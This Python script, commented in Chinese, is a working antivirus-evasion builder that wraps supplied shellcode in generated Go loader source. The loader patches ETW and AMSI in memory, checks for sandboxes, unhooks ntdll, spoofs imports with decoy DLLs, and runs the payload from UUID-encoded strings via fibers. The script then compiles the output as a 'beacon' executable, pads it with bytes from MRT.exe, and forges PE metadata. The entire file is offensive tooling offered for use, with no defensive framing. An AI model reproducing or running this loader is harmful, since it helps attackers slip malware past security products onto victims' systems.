#!/usr/bin/env python3
"""360 QVM 免杀 — Go 源码生成 + 编译 + Overlay注水 + PE修复
用法: <python命令> build_qvm.py <shellcode.bin> [--output-dir result/]
"""
import os, sys, random, string, struct, subprocess, glob as globmod

# ══════════════════════════════════════════
# Step 0: 参数解析 + 清理
# ══════════════════════════════════════════
if len(sys.argv) < 2:
    print(f'用法: {sys.argv[0]} <shellcode.bin> [--output-dir result/]')
    sys.exit(1)

shellcode_path = sys.argv[1]
output_dir = 'result'
if '--output-dir' in sys.argv:
    idx = sys.argv.index('--output-dir')
    output_dir = sys.argv[idx + 1]

os.makedirs(output_dir, exist_ok=True)

# 清理上次残留
for pattern in [f'{output_dir}/*.go', f'{output_dir}/*.exe', f'{output_dir}/.eout*']:
    for f in globmod.glob(pattern):
        os.remove(f)
        print(f'[0/5] Cleaned: {f}')

# ══════════════════════════════════════════
# Step 1: UUID 编码（端序预修正）
# ══════════════════════════════════════════
with open(shellcode_path, 'rb') as f:
    shellcode = f.read()
print(f'[1/5] Shellcode: {len(shellcode)} bytes ({shellcode_path})')

uuids = []
for i in range(0, len(shellcode), 16):
    chunk = bytearray(shellcode[i:i+16])
    need = 16 - len(chunk)
    if need > 0:
        chunk.extend(b'\x00' * need)
    # 预翻转 Data1(0-3) / Data2(4-5) / Data3(6-7) 对抗 UuidFromStringA 端序转换
    chunk[0], chunk[3] = chunk[3], chunk[0]
    chunk[1], chunk[2] = chunk[2], chunk[1]
    chunk[4], chunk[5] = chunk[5], chunk[4]
    chunk[6], chunk[7] = chunk[7], chunk[6]
    h = bytes(chunk).hex().upper()
    uuids.append(f'{h[0:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}')

print(f'[1/5] UUID count: {len(uuids)}')

# ══════════════════════════════════════════
# Step 2: 生成 Go 源码（全随机化）
# ══════════════════════════════════════════
def rn(n=4):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
def rk():
    return random.randint(0x3D, 0xC7)

# 函数名随机化
fn_xor = rn(3)
fn_etw = rn(4); fn_amsi = rn(4)
fn_sandbox = rn(5); fn_unhook = rn(5); fn_iat = rn(4)

# XOR 密钥随机化
k_k32=rk(); k_ntd=rk(); k_va=rk(); k_rmm=rk(); k_vp=rk()
k_etw_fn=rk(); k_amsi_fn=rk(); k_amsidll=rk()
k_gmhw=rk(); k_gmse=rk(); k_ntpath=rk(); k_gmfn=rk()
k_cttf=rk(); k_cf=rk(); k_stf=rk(); k_rpc=rk(); k_ufs=rk()
k_gdfs=rk(); k_gts=rk()
k_c32=rk(); k_msi=rk(); k_ver=rk(); k_wmm=rk()
k_g32=rk(); k_u32=rk(); k_shl=rk(); k_ole=rk(); k_adv=rk(); k_ws2=rk()
k_patch_etw = random.randint(0x01, 0xFE)
k_patch_amsi = random.randint(0x01, 0xFE)

def xenc(s, key):
    """XOR 编码字符串，返回 Go 字节切片字面量"""
    b = [c ^ key for c in s.encode()]
    assert ''.join(chr(c ^ key) for c in b) == s, f'XOR roundtrip failed: {s}'
    return ','.join(f'0x{x:02X}' for x in b)

E = lambda s, k: xenc(s, k)

# 所有敏感字符串 XOR 编码
ek32=E('kernel32.dll',k_k32); entd=E('ntdll.dll',k_ntd)
eva=E('VirtualAlloc',k_va); ermm=E('RtlMoveMemory',k_rmm)
evp=E('VirtualProtect',k_vp)
eetw=E('EtwEventWrite',k_etw_fn); eamsi=E('AmsiScanBuffer',k_amsi_fn)
eamd=E('amsi.dll',k_amsidll)
egh=E('GetModuleHandleW',k_gmhw); egm=E('GlobalMemoryStatusEx',k_gmse)
egf=E('GetModuleFileNameW',k_gmfn)
enp=E('C:\\\\Windows\\\\System32\\\\ntdll.dll',k_ntpath)
ecttf=E('ConvertThreadToFiber',k_cttf); ecf=E('CreateFiber',k_cf)
estf=E('SwitchToFiber',k_stf); erpc=E('Rpcrt4.dll',k_rpc)
eufs=E('UuidFromStringA',k_ufs)
egd=E('GetDiskFreeSpaceExW',k_gdfs); egt=E('GetTickCount64',k_gts)
# 冗余 DLL（IAT 欺骗）
ec32=E('comctl32.dll',k_c32); emsi=E('msimg32.dll',k_msi)
ever=E('version.dll',k_ver); ewmm=E('winmm.dll',k_wmm)
eg32=E('gdi32.dll',k_g32); eu32=E('user32.dll',k_u32)
eshl=E('shell32.dll',k_shl); eole=E('ole32.dll',k_ole)
eadv=E('advapi32.dll',k_adv); ews2=E('ws2_32.dll',k_ws2)

# 打补丁字节 XOR 编码
pet = f'0x{0xC3 ^ k_patch_etw:02X}'
pam = ','.join(f'0x{b ^ k_patch_amsi:02X}' for b in [0x48,0x31,0xC0,0xC3])

# 随机垃圾变量
ja, jb = rn(3), rn(3)
sn = rn(2)  # 沙箱结构体名

uuid_lines = ',\n'.join(f'\t\t"{u}"' for u in uuids)

go_src = f'''package main

import (
\t"os"
\t"runtime"
\t"syscall"
\t"unsafe"
)

func {fn_xor}(d []byte, k byte) string {{
\tb := make([]byte, len(d))
\tfor i := range d {{ b[i] = d[i] ^ k }}
\treturn string(b)
}}

func {fn_etw}() {{
\td1:=[]byte{{{entd}}};d2:=[]byte{{{ek32}}};d3:=[]byte{{{eetw}}};d4:=[]byte{{{evp}}};d5:=[]byte{{{ermm}}}
\tnt:={fn_xor}(d1,{k_ntd});kl:={fn_xor}(d2,{k_k32});nm:={fn_xor}(d3,{k_etw_fn});vp:={fn_xor}(d4,{k_vp});rm:={fn_xor}(d5,{k_rmm})
\thN,_:=syscall.LoadLibrary(nt);hK,_:=syscall.LoadLibrary(kl)
\tdefer syscall.FreeLibrary(hN);defer syscall.FreeLibrary(hK)
\tpE,_:=syscall.GetProcAddress(hN,nm);pV,_:=syscall.GetProcAddress(hK,vp);pR,_:=syscall.GetProcAddress(hN,rm)
\tif pE==0{{return}}
\tvar o uint32
\tsyscall.SyscallN(pV,pE,uintptr(1),0x40,uintptr(unsafe.Pointer(&o)))
\tpt:=byte({pet}^{k_patch_etw})
\tsyscall.SyscallN(pR,pE,uintptr(unsafe.Pointer(&pt)),uintptr(1))
\tsyscall.SyscallN(pV,pE,uintptr(1),uintptr(o),uintptr(unsafe.Pointer(&o)))
}}

func {fn_amsi}() {{
\td1:=[]byte{{{eamd}}};d2:=[]byte{{{eamsi}}};d3:=[]byte{{{ek32}}};d4:=[]byte{{{evp}}};d5:=[]byte{{{ermm}}}
\tad:={fn_xor}(d1,{k_amsidll});an:={fn_xor}(d2,{k_amsi_fn});kl:={fn_xor}(d3,{k_k32});vp:={fn_xor}(d4,{k_vp});rm:={fn_xor}(d5,{k_rmm})
\thA,_:=syscall.LoadLibrary(ad);hK,_:=syscall.LoadLibrary(kl)
\tdefer syscall.FreeLibrary(hA);defer syscall.FreeLibrary(hK)
\tpA,_:=syscall.GetProcAddress(hA,an)
\tif pA==0{{return}}
\tpV,_:=syscall.GetProcAddress(hK,vp);pR,_:=syscall.GetProcAddress(hK,rm)
\tvar o uint32
\tsyscall.SyscallN(pV,pA,uintptr(4),0x40,uintptr(unsafe.Pointer(&o)))
\tpt:=[]byte{{{pam}}}
\tfor i:=range pt{{pt[i]^={k_patch_amsi}}}
\tsyscall.SyscallN(pR,pA,uintptr(unsafe.Pointer(&pt[0])),uintptr(4))
\tsyscall.SyscallN(pV,pA,uintptr(4),uintptr(o),uintptr(unsafe.Pointer(&o)))
}}

type _s{sn} struct{{
\tdwLength, dwMemoryLoad uint32
\tullTotalPhys, ullAvailPhys, ullTotalPage, ullAvailPage, ullTotalVirtual, ullAvailVirtual, ullAvailExtendedVirtual uint64
}}

func {fn_sandbox}() {{
\tif runtime.NumCPU()<1{{os.Exit(0)}}
\td1:=[]byte{{{ek32}}};d2:=[]byte{{{egm}}};d3:=[]byte{{{egt}}};d4:=[]byte{{{egd}}}
\tkl:={fn_xor}(d1,{k_k32});gm:={fn_xor}(d2,{k_gmse});gt:={fn_xor}(d3,{k_gts});gd:={fn_xor}(d4,{k_gdfs})
\thK,_:=syscall.LoadLibrary(kl);defer syscall.FreeLibrary(hK)
\tpG,_:=syscall.GetProcAddress(hK,gm)
\tif pG!=0{{
\t\tvar ms _s{sn}
\t\tms.dwLength=uint32(unsafe.Sizeof(ms))
\t\tsyscall.SyscallN(pG,uintptr(unsafe.Pointer(&ms)))
\t\tif ms.ullTotalPhys<2*1024*1024*1024{{os.Exit(0)}}
\t}}
\tpT,_:=syscall.GetProcAddress(hK,gt)
\tif pT!=0{{
\t\tt,_,_:=syscall.SyscallN(pT)
\t\tif t<15000{{os.Exit(0)}}
\t}}
\tpD,_:=syscall.GetProcAddress(hK,gd)
\tif pD!=0{{
\t\tvar f,tl int64
\t\tcp,_:=syscall.UTF16PtrFromString("C:\\\\")
\t\tsyscall.SyscallN(pD,uintptr(unsafe.Pointer(cp)),uintptr(unsafe.Pointer(&f)),uintptr(unsafe.Pointer(&tl)),0)
\t\tif tl<60*1024*1024*1024{{os.Exit(0)}}
\t}}
}}

func {fn_unhook}() {{
\td1:=[]byte{{{entd}}};d2:=[]byte{{{egh}}};d3:=[]byte{{{evp}}};d4:=[]byte{{{ermm}}};d5:=[]byte{{{ek32}}}
\tnt:={fn_xor}(d1,{k_ntd});gh:={fn_xor}(d2,{k_gmhw});vp:={fn_xor}(d3,{k_vp});rm:={fn_xor}(d4,{k_rmm});kl:={fn_xor}(d5,{k_k32})
\tnd:={fn_xor}([]byte{{{enp}}},{k_ntpath})
\thK,_:=syscall.LoadLibrary(kl);defer syscall.FreeLibrary(hK)
\tpG,_:=syscall.GetProcAddress(hK,gh);pV,_:=syscall.GetProcAddress(hK,vp);pR,_:=syscall.GetProcAddress(hK,rm)
\tb,_,_:=syscall.SyscallN(pG,uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(nt))))
\tif b==0{{return}}
\tdt,e:=os.ReadFile(nd);if e!=nil{{return}}
\tdb:=uintptr(unsafe.Pointer(&dt[0]))
\tif*(*uint16)(unsafe.Pointer(db))!=0x5A4D{{return}}
\tno:=*(*uint32)(unsafe.Pointer(db+0x3C))
\tnh:=db+uintptr(no);fh:=nh+4
\tns:=*(*uint16)(unsafe.Pointer(fh+2));os:=*(*uint16)(unsafe.Pointer(fh+16))
\tsec:=nh+4+20+uintptr(os)
\tvar tv,ts,tr uint32
\tfor i:=uint16(0);i<ns;i++{{
\t\ts:=sec+uintptr(i)*40
\t\tnm:=(*[8]byte)(unsafe.Pointer(s))
\t\tif nm[0]=='.'&&nm[1]=='t'&&nm[2]=='e'&&nm[3]=='x'&&nm[4]=='t'{{tv=*(*uint32)(unsafe.Pointer(s+12));ts=*(*uint32)(unsafe.Pointer(s+8));tr=*(*uint32)(unsafe.Pointer(s+20));break}}
\t}}
\tif tv==0{{return}}
\ttx:=b+uintptr(tv)
\tvar o uint32
\tsyscall.SyscallN(pV,tx,uintptr(ts),0x40,uintptr(unsafe.Pointer(&o)))
\tsyscall.SyscallN(pR,tx,uintptr(unsafe.Pointer(&dt[tr])),uintptr(ts))
\tsyscall.SyscallN(pV,tx,uintptr(ts),uintptr(o),uintptr(unsafe.Pointer(&o)))
}}

func {fn_iat}() {{
\td1:=[]byte{{{ec32}}};d2:=[]byte{{{emsi}}};d3:=[]byte{{{ever}}};d4:=[]byte{{{ewmm}}};d5:=[]byte{{{eg32}}}
\td6:=[]byte{{{eu32}}};d7:=[]byte{{{eshl}}};d8:=[]byte{{{eole}}};d9:=[]byte{{{eadv}}};da:=[]byte{{{ews2}}}
\tsyscall.LoadLibrary({fn_xor}(d1,{k_c32}));syscall.LoadLibrary({fn_xor}(d2,{k_msi}))
\tsyscall.LoadLibrary({fn_xor}(d3,{k_ver}));syscall.LoadLibrary({fn_xor}(d4,{k_wmm}))
\tsyscall.LoadLibrary({fn_xor}(d5,{k_g32}));syscall.LoadLibrary({fn_xor}(d6,{k_u32}))
\tsyscall.LoadLibrary({fn_xor}(d7,{k_shl}));syscall.LoadLibrary({fn_xor}(d8,{k_ole}))
\tsyscall.LoadLibrary({fn_xor}(d9,{k_adv}));syscall.LoadLibrary({fn_xor}(da,{k_ws2}))
}}

func main() {{
\t{fn_sandbox}()
\t{fn_iat}()
\t{fn_etw}()
\t{fn_amsi}()
\t{fn_unhook}()

\t_{ja}:=make([]byte,{random.randint(64,256)})
\t_=_{ja}

\td1:=[]byte{{{ek32}}};d2:=[]byte{{{erpc}}};d3:=[]byte{{{eva}}};d4:=[]byte{{{ecttf}}};d5:=[]byte{{{ecf}}};d6:=[]byte{{{estf}}};d7:=[]byte{{{eufs}}}
\tk32:={fn_xor}(d1,{k_k32});rpc:={fn_xor}(d2,{k_rpc});va:={fn_xor}(d3,{k_va})
\tcttf:={fn_xor}(d4,{k_cttf});cf:={fn_xor}(d5,{k_cf});stf:={fn_xor}(d6,{k_stf});ufs:={fn_xor}(d7,{k_ufs})

\thK32,_:=syscall.LoadLibrary(k32);defer syscall.FreeLibrary(hK32)
\thRpc,_:=syscall.LoadLibrary(rpc);defer syscall.FreeLibrary(hRpc)

\tpVA,_:=syscall.GetProcAddress(hK32,va)
\tpCTTF,_:=syscall.GetProcAddress(hK32,cttf)
\tpCF,_:=syscall.GetProcAddress(hK32,cf)
\tpSTF,_:=syscall.GetProcAddress(hK32,stf)
\tpUFS,_:=syscall.GetProcAddress(hRpc,ufs)

\tuuids:=[]string{{
{uuid_lines},
\t}}

\tts:=uintptr(len(uuids))*16
\tbase,_,_:=syscall.SyscallN(pVA,0,ts,0x3000,0x40)
\tptr:=base
\tfor _,u:=range uuids{{
\t\tu8,_:=syscall.BytePtrFromString(u)
\t\tsyscall.SyscallN(pUFS,uintptr(unsafe.Pointer(u8)),ptr)
\t\tptr+=16
\t}}

\t_{jb}:={random.randint(1000,9999)}*{random.randint(10,99)}
\t_=_{jb}

\tsyscall.SyscallN(pCTTF,0)
\tfiber,_,_:=syscall.SyscallN(pCF,0,base,0)
\tsyscall.SyscallN(pSTF,fiber)
}}
'''

go_name = os.path.join(output_dir, 'beacon_qvm.go')
with open(go_name, 'w', encoding='utf-8') as f:
    f.write(go_src)
print(f'[2/5] Go source: {go_name} ({len(go_src):,} bytes)')

# ══════════════════════════════════════════
# Step 3: 编译
# ══════════════════════════════════════════
print('[3/5] Compiling...')
cwd = os.getcwd()
os.chdir(output_dir)
r = os.system('set GOOS=windows&& set GOARCH=amd64&& go build -trimpath -ldflags="-s -w -H windowsgui" -o beacon_qvm.exe beacon_qvm.go')
os.chdir(cwd)
if r != 0:
    print('COMPILE FAILED!')
    sys.exit(1)

exe_path = os.path.join(output_dir, 'beacon_qvm.exe')
sz = os.path.getsize(exe_path)
print(f'[3/5] Compiled: {exe_path} ({sz:,} bytes)')

# ══════════════════════════════════════════
# Step 4: Overlay 注水 + PE 元数据修复
# ══════════════════════════════════════════
print('[4/5] Overlay + PE fix...')
with open(exe_path, 'rb') as f:
    exe = f.read()

# Overlay from MRT.exe
mrt = 'C:/Windows/System32/MRT.exe'
if os.path.exists(mrt):
    with open(mrt, 'rb') as f:
        f.seek(-300_000, 2)
        overlay = f.read()
else:
    overlay = bytes([random.randint(0x20, 0x7E) for _ in range(300_000)])

padded = bytearray(exe + overlay)

# PE metadata fix
pe_off = struct.unpack_from('<I', padded, 0x3C)[0]
struct.pack_into('<I', padded, pe_off + 8, 0x62C3B8E5)  # TimeDateStamp: 2022-07-04
oh_off = pe_off + 4 + 20
padded[oh_off + 2] = 14  # MajorLinkerVersion: VS2019
padded[oh_off + 3] = 0   # MinorLinkerVersion

padded_path = os.path.join(output_dir, 'beacon_qvm_padded.exe')
with open(padded_path, 'wb') as f:
    f.write(padded)

print(f'[4/5] Padded: {padded_path} ({len(padded):,} bytes)')
print(f'      Overlay: {len(overlay):,} bytes, PE: TS=0x62C3B8E5 LKV=14.0')

# ══════════════════════════════════════════
# Step 5: 验证
# ══════════════════════════════════════════
print('[5/5] Verifying...')
hdr = padded[:2]
valid = hdr == b'MZ'
print(f'      MZ header: {"OK" if valid else "FAIL"}')
print(f'[5/5] DONE: {padded_path}')
